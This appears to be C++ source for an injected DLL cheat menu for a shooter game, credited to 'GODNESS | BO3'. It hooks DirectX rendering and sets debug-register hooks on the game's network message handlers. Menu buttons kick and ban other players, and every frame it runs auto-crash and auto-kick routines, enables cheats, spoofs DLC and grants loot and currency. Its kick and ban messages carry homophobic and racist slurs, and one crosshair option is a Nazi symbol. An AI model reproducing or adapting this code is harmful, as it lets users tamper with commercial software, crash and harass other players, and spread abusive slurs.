		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		if (ImGui::Button("High Speed"))
		{
			Cbuf_AddText(0, "g_speed 600");
		}

		ImGui::SameLine();

		ImGui::Dummy(ImVec2(5.0f, 0.0f));

		ImGui::SameLine();

		if (ImGui::Button("Default Speed"))
		{
			Cbuf_AddText(0, "g_speed 200");
		}

		//ImGui::SameLine();

		//ImGui::Dummy(ImVec2(5.0f, 0.0f));

		//ImGui::SameLine();


		//if (ImGui::Button("Infinity Ammos"))
		//{
		//	Cbuf_AddText(0, "noclip");
		//}

		//_______________________________OFFHOST BOLD MESSAGES CLIENT SIDE_____________________________\\

		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::Separator();

		static auto Messag = ""s;


		ImGui::Dummy(ImVec2(0.0f, 3.0f));

		ImGui::InputTextWithHint("##BOLDMESSAGES", "Boldmessages", &Messag);

		ImGui::SameLine();

		if (ImGui::Button("bold messages"))
		{
			CG_BoldGameMessageCenter(0, Messag.data(), 10);
		}

		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 3.0f));


		if (ImGui::CollapsingHeader(" players (Mainly Zombie)"))
		{

			if (ImGui::CollapsingHeader("Player 1 (white)"))
			{
				if (ImGui::Button("Kick p1"))
				{
					Cbuf_AddText(0, "clientkick 0");
				}

				if (ImGui::Button("2nd Kick p1"))
				{
					Cbuf_AddText(0, "clientkick_for_reason 0 ^7You_^2FAGGOT_NIGGER^7_has_been_^1KICKED_from_the_server!!");
				}

				if (ImGui::Button("Ban p1"))
				{
					Cbuf_AddText(0, "clientban_for_reason 0 ^7You_^2FAGGOT_NIGGER^7_has_been_^1BANNED_from_the_server!!");
				}

				if (ImGui::Button("TempBan p1"))
				{
					Cbuf_AddText(0, "tempBanClient 0");
				}

			}

			if (ImGui::CollapsingHeader("Player 2 (blue)"))
			{
				if (ImGui::Button("Kick p2"))
				{
					Cbuf_AddText(0, "clientkick 1");
				}


				if (ImGui::Button("2nd Kick p2"))
				{
					Cbuf_AddText(0, "clientkick_for_reason 1 ^7You_^2FAGGOT_NIGGER^7_has_been_^1KICKED_from_the_server!!");
				}

				if (ImGui::Button("Ban p2"))
				{
					Cbuf_AddText(0, "clientban_for_reason 1 ^7You_^2FAGGOT_NIGGER^7_has_been_^1BANNED_from_the_server!!");
				}

				if (ImGui::Button("TempBan p2"))
				{
					Cbuf_AddText(0, "tempBanClient 1");
				}

				

			}

			if (ImGui::CollapsingHeader("Player 3 (orange)"))
			{
				if (ImGui::Button("Kick p3"))
				{
					Cbuf_AddText(0, "clientkick 2");
				}

				if (ImGui::Button("2nd Kick p3"))
				{
					Cbuf_AddText(0, "clientkick_for_reason 2 ^7You_^2FAGGOT_NIGGER^7_has_been_^1KICKED_from_the_server!!");
				}

				if (ImGui::Button("Ban p3"))
				{
					Cbuf_AddText(0, "clientban_for_reason 2 ^7You_^2FAGGOT_NIGGER^7_has_been_^1BANNED_from_the_server!!");
				}



				if (ImGui::Button("TempBan p3"))
				{
					Cbuf_AddText(0, "tempBanClient 2");
				}

			}

			if (ImGui::CollapsingHeader("Player 4 (green)"))
			{
				if (ImGui::Button("Kick p4"))
				{
					Cbuf_AddText(0, "clientkick 3");
				}

				if (ImGui::Button("2nd Kick p4"))
				{
					Cbuf_AddText(0, "clientkick_for_reason 3 ^7You_^2FAGGOT_NIGGER^7_has_been_^1KICKED_from_the_server!!");
				}

				if (ImGui::Button("Ban p4"))
				{
					Cbuf_AddText(0, "clientban_for_reason 3 ^7You_^2FAGGOT_NIGGER^7_has_been_^1BANNED_from_the_server!!");
				}

				if (ImGui::Button("TempBan p4"))
				{
					Cbuf_AddText(0, "tempBanClient 3");
				}

			}


		}


		ImGui::Separator();

		ImGui::Dummy(ImVec2(0.0f, 3.0f));



		if (ImGui::CollapsingHeader(" Weapons"))
		{
			if (ImGui::CollapsingHeader("Wonder weapons"))
			{
				if (ImGui::Button("DEFAULT"))
				{
					Cbuf_AddText(0, "give defaultweapon");
				}
				ImGui::SameLine();
				if (ImGui::Button("MINI GUN"))
				{
					Cbuf_AddText(0, "give minigun");
				}
				ImGui::SameLine();
				if (ImGui::Button("BOWIE KNIFE"))
				{
					Cbuf_AddText(0, "give bowie_knife");
				}

				if (ImGui::Button("MARASTAGWA"))
				{
					Cbuf_AddText(0, "give Idgun");
				}
				ImGui::SameLine();
				if (ImGui::Button("RAY GUN"))
				{
					Cbuf_AddText(0, "give ray_gun");
				}
				ImGui::SameLine();
				if (ImGui::Button("DG4"))
				{
					Cbuf_AddText(0, "give Tesla_gun");
				}
				ImGui::SameLine();
				if (ImGui::Button("MASAMUNE"))
				{
					Cbuf_AddText(0, "give hero_mirg2000_upgraded_2");
				}
			}
			if (ImGui::CollapsingHeader("Bows"))
			{
				if (ImGui::Button("BASIC BOW"))
				{
					Cbuf_AddText(0, "give elemental_bow");
				}	ImGui::SameLine();
				if (ImGui::Button("STORM BOW"))
				{
					Cbuf_AddText(0, "give elemental_bow_storm");
				}	ImGui::SameLine();
				if (ImGui::Button("VOID BOW"))
				{
					Cbuf_AddText(0, "give elemental_bow_demongate");
				}	ImGui::SameLine();
				if (ImGui::Button("FIRE BOW"))
				{
					Cbuf_AddText(0, "give elemental_bow_rune_prison");
				}	ImGui::SameLine();
				if (ImGui::Button("WOLF BOW"))
				{
					Cbuf_AddText(0, "give elemental_bow_wolf_howl");
				}
			}

			if (ImGui::CollapsingHeader("Assault"))
			{
				if (ImGui::Button("MAN-O-WAR"))
				{
					Cbuf_AddText(0, "give ar_damage");
				}
				ImGui::SameLine();
				if (ImGui::Button("KN-44"))
				{
					Cbuf_AddText(0, "give ar_standard");
				}
				ImGui::SameLine();
				if (ImGui::Button("SHEIVA"))
				{
					Cbuf_AddText(0, "give ar_marksman");
				}
				if (ImGui::Button("HVHK-30"))
				{
					Cbuf_AddText(0, "give ar_cqb");
				}ImGui::SameLine();
				if (ImGui::Button("M8A7"))
				{
					Cbuf_AddText(0, "give ar_longburst");
				}ImGui::SameLine();
				if (ImGui::Button("ICR-1"))
				{
					Cbuf_AddText(0, "give ar_accurate");
				}
			}
			if (ImGui::CollapsingHeader("Pistol-Mi"))
			{
				if (ImGui::Button("KUDA"))
				{
					Cbuf_AddText(0, "give smg_standard");
				}ImGui::SameLine();
				if (ImGui::Button("VMP"))
				{
					Cbuf_AddText(0, "give smg_versatile");
				}ImGui::SameLine();
				if (ImGui::Button("WEEVIL"))
				{
					Cbuf_AddText(0, "give smg_capacity");
				}
				if (ImGui::Button("VESPER"))
				{
					Cbuf_AddText(0, "give smg_fastfire");
				}ImGui::SameLine();
				if (ImGui::Button("PHARO"))
				{
					Cbuf_AddText(0, "give smg_burst");
				}ImGui::SameLine();
				if (ImGui::Button("RAZORBACK"))
				{
					Cbuf_AddText(0, "give smg_longrange");
				}
				if (ImGui::Button("BOOTLEGER"))
				{
					Cbuf_AddText(0, "give smg_sten");
				}
			}
			if (ImGui::CollapsingHeader("Shot-Gun"))
			{
				if (ImGui::Button("KRM-262"))
				{
					Cbuf_AddText(0, "give shotgun_pump");
				}ImGui::SameLine();
				if (ImGui::Button("205 BRECCI"))
				{
					Cbuf_AddText(0, "give shotgun_semiauto");
				}ImGui::SameLine();
				if (ImGui::Button("HAYMAKER 12"))
				{
					Cbuf_AddText(0, "give shotgun_fullauto");
				}ImGui::SameLine();
				if (ImGui::Button("ARGUS"))
				{
					Cbuf_AddText(0, "give shotgun_precision");
				}
			}
			if (ImGui::CollapsingHeader("LMG"))
			{
				if (ImGui::Button("BRM"))
				{
					Cbuf_AddText(0, "give lmg_light");
				}ImGui::SameLine();
				if (ImGui::Button("DINGO"))
				{
					Cbuf_AddText(0, "give lmg_cqb");
				}ImGui::SameLine();
				if (ImGui::Button("GORGON"))
				{
					Cbuf_AddText(0, "give lmg_slowfire");
				}ImGui::SameLine();
				if (ImGui::Button("48 DREDGE"))
				{
					Cbuf_AddText(0, "give lmg_heavy");
				}
			}
			if (ImGui::CollapsingHeader("Sniper"))
			{
				if (ImGui::Button("DRAKON"))
				{
					Cbuf_AddText(0, "give sniper_fastsemi");
				}ImGui::SameLine();
				if (ImGui::Button("LOCUS"))
				{
					Cbuf_AddText(0, "give sniper_fastbolt");
				}ImGui::SameLine();
				if (ImGui::Button("SVG-100"))
				{
					Cbuf_AddText(0, "give sniper_powerbolt");
				}
			}
		}

		ImGui::EndTabItem();
	}

}





bool is_dvar_return_address(LPEXCEPTION_POINTERS ExceptionInfo, std::uintptr_t retaddr)
{
	return *reinterpret_cast<std::uintptr_t*>(ExceptionInfo->ContextRecord->Rsp + 0x28) == retaddr;
}

bool init = false;
bool give_divinium = false;
bool give_crypto = false;
std::string exception_date;

FORCEINLINE std::string begin_exception() {
	std::ofstream myfile;
	myfile.open(exception_date.c_str(), std::ios_base::app);

	myfile.close();
	return "begun"s;
}

FORCEINLINE std::string end_exception() {
	std::ofstream myfile;
	myfile.open(exception_date.c_str(), std::ios_base::app);
	myfile.close();
	return "ended"s;
}

template<typename... Parameters>
FORCEINLINE std::string write_exception(std::string format, Parameters... params)
{
	char szBuffer[4096] = { NULL };
	sprintf_s(szBuffer, format.c_str(), params...);

	time_t currentTime;
	struct tm* localTime;

	time(&currentTime);
	localTime = localtime(&currentTime);

	char buffer[80];

	strftime(buffer, 80, "godness/logs/exceptions/exceptions-%y-%m-%d.txt", localTime);
	exception_date = buffer;

	std::ofstream myfile;
	myfile.open(exception_date.c_str(), std::ios_base::app);
	myfile << szBuffer << "\n";
	myfile.close();
	return szBuffer;
}

void catch_exception(LPEXCEPTION_RECORD ExceptionRecord, LPCONTEXT ContextRecord)
{
	MEMORY_BASIC_INFORMATION mbi;
	VirtualQuery(ExceptionRecord->ExceptionAddress, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

	char modulename[MAX_PATH];
	bool module_is_filled = false;

	DWORD module_name = 0;
	if (RtlPcToFileHeader(ExceptionRecord->ExceptionAddress, &mbi.AllocationBase)) {
		module_name = GetModuleFileNameA((HMODULE)reinterpret_cast<std::uintptr_t>(mbi.AllocationBase), modulename, sizeof(modulename));
		char* last_slash = strrchr(modulename, '\\');

		module_is_filled = true;
	}

	auto module_offset = reinterpret_cast<std::uintptr_t>(ExceptionRecord->ExceptionAddress) - reinterpret_cast<std::uintptr_t>(mbi.AllocationBase);

	begin_exception();
	write_exception("Image base: 0x%llX", qwProcessBase);
	write_exception("Cheat base: 0x%llX", dllbase);

	write_exception("Exception at: [ 0x%llX ] ", ContextRecord->Rip);
	write_exception("Exception address: 0x%llX (0x%llX)", ExceptionRecord->ExceptionAddress, module_offset);

	write_exception("Exception code: 0x%llX", ExceptionRecord->ExceptionCode);

	write_exception("Rax: 0x%llX", ContextRecord->Rax);
	write_exception("Rcx: 0x%llX", ContextRecord->Rcx);
	write_exception("Rdx: 0x%llX", ContextRecord->Rdx);
	write_exception("Rbx: 0x%llX", ContextRecord->Rbx);

	write_exception("Rsp: 0x%llX", ContextRecord->Rsp);
	write_exception("Rbp: 0x%llX", ContextRecord->Rbp);

	write_exception("Rsi: 0x%llX", ContextRecord->Rsi);
	write_exception("Rdi: 0x%llX", ContextRecord->Rdi);

	write_exception("R8: 0x%llX", ContextRecord->R8);
	write_exception("R9: 0x%llX", ContextRecord->R9);
	write_exception("R10: 0x%llX", ContextRecord->R10);
	write_exception("R11: 0x%llX", ContextRecord->R11);
	write_exception("R12: 0x%llX", ContextRecord->R12);
	write_exception("R13: 0x%llX", ContextRecord->R13);
	write_exception("R14: 0x%llX", ContextRecord->R14);
	write_exception("R15: 0x%llX", ContextRecord->R15);

	for (auto i{ 0 }; i < 50; i++)
	{
		write_exception("Rsp+%i: 0x%llX", i * sizeof(std::uintptr_t), reinterpret_cast<std::uintptr_t*>(ContextRecord->Rsp)[i]);
	}

	end_exception();
}


LONG CALLBACK hookHandler(LPEXCEPTION_POINTERS ex)
{
	if (ex->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
	{

		//if (ex->ContextRecord->Rip == (uintptr_t)qwProcessBase + 0x1E09030)
		//{
		//	ex->ContextRecord->Rip = (uintptr_t)hkLiveInventory_GetItemQuantity;

		//}

		if (ex->ContextRecord->Rip == (uintptr_t)(qwProcessBase + 0x1EC75D0))
		{
			ex->ContextRecord->Rip = (uintptr_t)hkNameLength;
		}
		else if (ex->ContextRecord->Rip == (uintptr_t)dwInstantDispatchMessage)
		{
			ex->ContextRecord->Rip = (uintptr_t)hkdwInstantDispatchMessage;
		}
		else if (ex->ContextRecord->Rip == (uintptr_t)CL_ConnectionlessCMD)
		{
			return hkCL_ConnectionlessCMD(ex);
		}
		else if (ex->ContextRecord->Rip == (uintptr_t)LobbyMsgRW_PackageElement2)
		{
			hkLobbyMsgRW_PackageElement(ex);

			return EXCEPTION_CONTINUE_EXECUTION;
		}
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	//HandlePacketInternal
	switch (ex->ContextRecord->Rcx)
	{
	case 0xC0000069:
		if (is_dvar_return_address(ex, qwProcessBase + 0x1EF800B))
		{
			hkHandlePacketInternal(ex);
		}

		ex->ContextRecord->Rcx = lobbymsg_prints_bak;

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	switch (ex->ContextRecord->Rbx)
	{

	case 0xC0000069:

		ex->ContextRecord->Rbx = lobbymsg_prints_bak;

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	//UI_Interface_DrawText
	switch (ex->ContextRecord->Rcx)
	{
	case 0xC0000420:
		if (is_dvar_return_address(ex, qwProcessBase + 0x1F34A57))
		{
			hkUI_Interface_DrawText(ex);
		}

		ex->ContextRecord->Rcx = loc_warnings_bak;

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	switch (ex->ContextRecord->Rbx)
	{

	case 0xC0000420:

		ex->ContextRecord->Rbx = loc_warnings_bak;

		return EXCEPTION_CONTINUE_EXECUTION;
	}

	//hkLiveInventory_GetItemQuantity
	//switch (ex->ContextRecord->Rcx)
	//{
	//case 0xC0069420:
	//	if (is_dvar_return_address(ex, qwProcessBase + 0x1E09030))
	//	{
	//		hkLiveInventory_GetItemQuantity(ex);
	//	}

	//	ex->ContextRecord->Rcx = sumshitidkwhat_bak;

	//	return EXCEPTION_CONTINUE_EXECUTION;
	//}

	//switch (ex->ContextRecord->Rbx)
	//{

	//case 0xC0069420:

	//	ex->ContextRecord->Rbx = sumshitidkwhat_bak;

	//	return EXCEPTION_CONTINUE_EXECUTION;
	//}

	catch_exception(ex->ExceptionRecord, ex->ContextRecord);

	return EXCEPTION_CONTINUE_EXECUTION;

}

void on_frame()
{
	static bool enabled;

	if (is_match_loaded() && !enabled)
	{

		MH_CreateHook((void*)(qwProcessBase + 0x1321110), hkCL_GetConfigString, (void**)&CL_GetConfigString);
		MH_EnableHook((void*)(qwProcessBase + 0x1321110));


		MH_CreateHook((LPVOID)(qwProcessBase + 0x1337360), hkObituary, (LPVOID*)&Obituary);
		MH_EnableHook((LPVOID)(qwProcessBase + 0x1337360));



		enabled = true;
	}
	else if (!is_in_game() && enabled)
	{

		MH_RemoveHook((void*)(qwProcessBase + 0x1321110));
		MH_DisableHook((void*)(qwProcessBase + 0x1321110));


		MH_DisableHook((LPVOID)(qwProcessBase + 0x1337360));
		MH_RemoveHook((LPVOID)(qwProcessBase + 0x1337360));




		enabled = false;
	}
}


void initializeHook() {



	lobbymsg_prints_bak = *reinterpret_cast<std::uintptr_t*>(qwProcessBase + 0x1574D840); // backup original value //00 41 91 8A F7 7F 00 00 A0 41 91 8A F7 7F 00 00 40 42 91 8A F7 7F 00 00 E0 42 91 8A F7 7F 00 00 80 7F 91
	*reinterpret_cast<std::uintptr_t*>(qwProcessBase + 0x1574D840) = 0xC0000069; // force exception when dvar is used

	loc_warnings_bak = *reinterpret_cast<std::uintptr_t*>(qwProcessBase + 0x1791ED70); // backup original value //00 03 8E 8A F7 7F 00 00 A0 03 8E 8A F7 7F 00 00 40 04 8E 8A F7 7F 00 00 00 00 00 00 FF FF FF 3E F3 04 35
	*reinterpret_cast<std::uintptr_t*>(qwProcessBase + 0x1791ED70) = 0xC0000420; // force exception when dvar is used

	//cg_draw2d_bak = *reinterpret_cast<std::uintptr_t*>(qwProcessBase + 0x4A33988); // backup original value
	//*reinterpret_cast<std::uintptr_t*>(qwProcessBase + 0x4A33988) = 0xC0069420; // force exception when dvar is used


	Initialize();

	//*(BYTE*)(module + 0x17ABD297) = 0xFF;
	//*(BYTE*)(module + 0x17ABD29B) = 0xFF;	
	//*(BYTE*)(module + 0x17ABD29F) = 0x3F;


	THREADENTRY32 te32;
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (hThreadSnap)
	{
		te32.dwSize = sizeof(THREADENTRY32);

		if (!Thread32First(hThreadSnap, &te32))
		{
			CloseHandle(hThreadSnap);
		}
		else {
			do
			{
				if (te32.th32OwnerProcessID == GetCurrentProcessId() && te32.th32ThreadID != GetCurrentThreadId())
				{
					HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, 0, te32.th32ThreadID);
					if (hThread)
					{
						CONTEXT context;
						context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
						SuspendThread(hThread);

						if (GetThreadContext(hThread, &context))
						{

							/*context.Dr0 = (uintptr_t)qwProcessBase + 0x1E09030;*/ //HkItemQuantity
							context.Dr0 = (uintptr_t)(qwProcessBase + 0x1EC75D0); //HkShortenName
							context.Dr1 = (uintptr_t)dwInstantDispatchMessage;
							context.Dr2 = (uintptr_t)CL_ConnectionlessCMD;
							context.Dr3 = (uintptr_t)LobbyMsgRW_PackageElement2;
							context.Dr7 = (1 << 0) | (1 << 2) | (1 << 4) | (1 << 6);



							SetThreadContext(hThread, &context);
						}

						ResumeThread(hThread);
						CloseHandle(hThread);
					}
				}
			} while (Thread32Next(hThreadSnap, &te32));
			CloseHandle(hThreadSnap);
		}
	}
	SetUnhandledExceptionFilter(hookHandler);
}



#define Hook(original, hook) (DetourTransactionBegin(), DetourUpdateThread(GetCurrentThread()), DetourAttach((LPVOID*)&original, (LPVOID)hook), DetourTransactionCommit())
#define Unhook(original, hook) (DetourTransactionBegin(), DetourUpdateThread(GetCurrentThread()), DetourDetach((LPVOID*)&original, (LPVOID)hook), DetourTransactionCommit())


bool should_ignore_msg(UINT msg)
{
	switch (msg)
	{
	case WM_MOUSEACTIVATE:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MBUTTONDBLCLK:
	case WM_MOUSEMOVE:
	case WM_NCHITTEST:
	case WM_MOUSEWHEEL:
	case WM_MOUSEHOVER:
	case WM_ACTIVATEAPP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_RBUTTONDBLCLK:
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_CHAR:
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_LBUTTONDBLCLK:
	case WM_SETCURSOR:
		return true;
	default:
		return false;
	}
}



void InitImGui()
{
	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	io.ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;
	ImGui_ImplWin32_Init(window);
	ImGui_ImplDX11_Init(pDevice, pContext);
	ImGui::GetIO().Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Arial.ttf", 14.0f);

	ImGui::MergeIconsWithLatestFont(16.f, false);
}

LRESULT __stdcall WndProc(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {

	const auto should_ignore{ open == true && !ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam) };

	if (should_ignore && should_ignore_msg(uMsg))
	{
		return true;
	}

	if (true && ImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam))
		return true;

	return CallWindowProc(oWndProc, hWnd, uMsg, wParam, lParam);
}







HRESULT __stdcall hkPresent(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)
{
	if (!init)
	{
		if (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&pDevice)))
		{
			pDevice->GetImmediateContext(&pContext);
			DXGI_SWAP_CHAIN_DESC sd;
			pSwapChain->GetDesc(&sd);
			window = sd.OutputWindow;
			ID3D11Texture2D* pBackBuffer;
			pSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);
			pDevice->CreateRenderTargetView(pBackBuffer, NULL, &mainRenderTargetView);
			pBackBuffer->Release();
			oWndProc = (WNDPROC)SetWindowLongPtr(window, GWLP_WNDPROC, (LONG_PTR)WndProc);
			InitImGui();
			refresh_friends();
			init = true;
		}

		else
			return oPresent(pSwapChain, SyncInterval, Flags);
	}

	if (GetAsyncKeyState(VK_DELETE) & 1)
	{
		open = !open;
	}

	if (GetAsyncKeyState(VK_F2) & 1)
	{
		Cbuf_AddText(0, "disconnect");
	}

	ImGui::GetIO().MouseDrawCursor = open;

	ImGui_ImplDX11_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();

	ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.f); // Round borders
	ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0.00f, 0.00f, 0.00f, 0.55f)); // Background color
	ImGui::RenderNotifications(); // <-- Here we render all notifications
	ImGui::PopStyleVar(1); // Don't forget to Pop()
	ImGui::PopStyleColor(1);

	auto& style = ImGui::GetStyle();

	if (open == true)
	{

		std::string watermark_str = "GODNESS | BO3 | Coded by Wanted";
		ImColor cc = ImVec4(0.45f, 0.00f, 2.55f, 1.00f);
		ImVec2 watermark_size = ImGui::CalcTextSize(watermark_str.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImVec2(6, 5), ImColor(255, 255, 255, 255), "GODNESS");
		ImGui::GetOverlayDrawList()->AddText(ImVec2(6 + ImGui::CalcTextSize("GODNESS ").x, 5), ImColor(255, 255, 255, 255), "| BO3 | Coded by Wanted");

		style.WindowTitleAlign = ImVec2(0.5, 0.5);
		ImGui::SetNextWindowSize({ 670.00, 430.00 });
		*(int*)((DWORD64)GetModuleHandleA(NULL) + 0x17E6F335) = 0;
		ImGui::Begin("Private Godness BO3", nullptr, ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize);
		{
			if (ImGui::BeginTabBar("Main", ImGuiTabBarFlags_NoTooltip | ImGuiWindowFlags_NoResize))
			{
				players();
				misc();
				friendslist();
				/*recentplayers();*/
				/*tools();*/
				Developer();
				drawserverlist();
				hosttab();

	

				ImGui::EndTabBar();
			}
			ImGui::SameLine();

			ImGui::Dummy(ImVec2(280.0f, 0.0f));

			ImGui::SameLine();

			ImGui::Dummy(ImVec2(0.0f, -5.0f));

			ImGui::SameLine();

			if (AreWeInGameAndHosting())
			{
				ImGui::TextColored(ImVec4(0, 255, 0, 255), " Host ");
			}
			else
			{
				ImGui::TextColored(ImVec4(255, 0, 0, 255), " Not Host ");
			}

			ImGui::End();
		}
	}
	else
	{
		*(int*)((DWORD64)GetModuleHandleA(NULL) + 0x17E6F335) = 1;
	}



	//if (Live_IsUserInGame(0))
	//{
	//	get_players();
	//}

	on_frame();
	autocrash();
	autokick();
	request_loop();
	cacheXUID = LiveUser_GetXUID(0);
	SpoofDLC();

	Dvar_SetFromStringByName("sv_cheats", "1", 1);
	Dvar_SetFromStringByName("developer", "2", 2);

	if (whitecard)
	{
		*(int*)(qwProcessBase + 0x11306D40) = 750;
	}

	if (invisiblecard)
	{
		*(int*)(qwProcessBase + 0x11306D40) = 1000;
	}

	if (ct)
	{
		GiveLootToSelf(0, 1, 1500);
	}

	if (div_loop)
	{
		char buf_cmd[255];
		sprintf_s(buf_cmd, "%c %u %u", 120, 3, 120);
		SV_GameSendServerCommand(0, 1, buf_cmd);
	}

	if (bCryptoSpend) {
		if (ct) {
			ct = false;
		}

		Loot_BuyCrate(0, 1, 2);

	}

	if (bDiviniumSpend) {
		/*if (div_loop) {
			div_loop = false;
		}*/

		Loot_SpendVials(0, 3);

	}




	if (crosscrosshair == 0 && circlecrosshair == 0 && pointcrosshair == 0 && nazicrosshair == 0)
	{
		Dvar_SetFromStringByName("cg_drawcrosshair", "1", 1);
	}
	else Dvar_SetFromStringByName("cg_drawcrosshair", "0", 0);

	//if (timescaling == true)
	//{
	//	Dvar_SetFromStringByName("timescale", "5.00", 1);
	//}
	//else Dvar_SetFromStringByName("	timescale", "1.00", 0);


	if (Com_IsInGame())
	{
		if (nazicrosshair) {

			POINT Screen; int oodofdfo, jbjfdbdsf;
			Screen.x = GetSystemMetrics(0);
			Screen.y = GetSystemMetrics(1);
			//Middle POINT
			POINT Middle; Middle.x = (int)(Screen.x / 2); Middle.y = (int)(Screen.y / 2);
			int a = (int)(Screen.y / 2 / 30);
			float gamma = atan(a / a);
			faken_rot++;
			int Drehungswinkel = faken_rot;

			int i = 0;
			while (i < 4)
			{
				std::vector <int> p;
				p.push_back(a * sin(GRD_TO_BOG(Drehungswinkel + (i * 90))));                                    //p[0]        p0_A.x
				p.push_back(a * cos(GRD_TO_BOG(Drehungswinkel + (i * 90))));                                    //p[1]        p0_A.y
				p.push_back((a / cos(gamma)) * sin(GRD_TO_BOG(Drehungswinkel + (i * 90) + BOG_TO_GRD(gamma))));    //p[2]        p0_B.x
				p.push_back((a / cos(gamma)) * cos(GRD_TO_BOG(Drehungswinkel + (i * 90) + BOG_TO_GRD(gamma))));    //p[3]        p0_B.y

				ImGui::GetBackgroundDrawList()->AddLine(ImVec2(Middle.x, Middle.y), ImVec2(Middle.x + p[0], Middle.y - p[1]), IM_COL32(255, 0, 0, 255));
				ImGui::GetBackgroundDrawList()->AddLine(ImVec2(Middle.x + p[0], Middle.y - p[1]), ImVec2(Middle.x + p[2], Middle.y - p[3]), IM_COL32(255, 0, 0, 255));

				i++;
			}

		}

		if (circlecrosshair)
		{
			Dvar_SetFromStringByName("cg_drawCrosshair", "0", 0);
			auto draw = ImGui::GetBackgroundDrawList();
			draw->AddCircle(ImVec2(1920 / 2, 1080 / 2), 3.0, ImColor(0, 255, 0, 255), 100, 1.0f);
		}

		if (crosscrosshair)
		{
			Dvar_SetFromStringByName("cg_drawCrosshair", "0", 0);
			ImGui::GetOverlayDrawList()->AddLine(ImVec2(1920 / 2 - 8, 1080 / 2), ImVec2(1920 / 2 + 3, 1080 / 2), ImColor(0, 255, 0, 255), 1.5f);
			ImGui::GetOverlayDrawList()->AddLine(ImVec2(1920 / 2 + 8, 1080 / 2), ImVec2(1920 / 2 + 3, 1080 / 2), ImColor(0, 255, 0, 255), 1.5f);
			ImGui::GetOverlayDrawList()->AddLine(ImVec2(1920 / 2, 1080 / 2 - 8), ImVec2(1920 / 2, 1080 / 2 + 2), ImColor(0, 255, 0, 255), 1.5f);
			ImGui::GetOverlayDrawList()->AddLine(ImVec2(1920 / 2, 1080 / 2 + 8), ImVec2(1920 / 2, 1080 / 2 + 2), ImColor(0, 255, 0, 255), 1.5f);

		}

		if (pointcrosshair)
		{
			Dvar_SetFromStringByName("cg_drawCrosshair", "0", 0);
			auto draw = ImGui::GetBackgroundDrawList();
			draw->AddCircle(ImVec2(1920 / 2, 1080 / 2), 1.5, ImColor(0, 255, 0, 255), 100, 1.0f);
		}
	}

	ImGui::Render();

	pContext->OMSetRenderTargets(1, &mainRenderTargetView, NULL);
	ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
	return oPresent(pSwapChain, SyncInterval, Flags);
}

DWORD WINAPI MainThread(LPVOID lpReserved)
{
	bool init_hook = false;
	do
	{
		if (kiero::init(kiero::RenderType::D3D11) == kiero::Status::Success)
		{
			kiero::bind(8, (void**)&oPresent, hkPresent);
			init_hook = true;
		}
	} while (!init_hook);
	return TRUE;
}

BOOL WINAPI DllMain(HMODULE hMod, DWORD dwReason, LPVOID lpReserved)
{

	switch (dwReason)
	{

	case DLL_PROCESS_ATTACH:
		initializeHook();
		DisableThreadLibraryCalls(hMod);
		CreateThread(nullptr, 0, MainThread, hMod, 0, nullptr);
		break;
	case DLL_PROCESS_DETACH:
		kiero::shutdown();
		break;
	}
	return TRUE;
}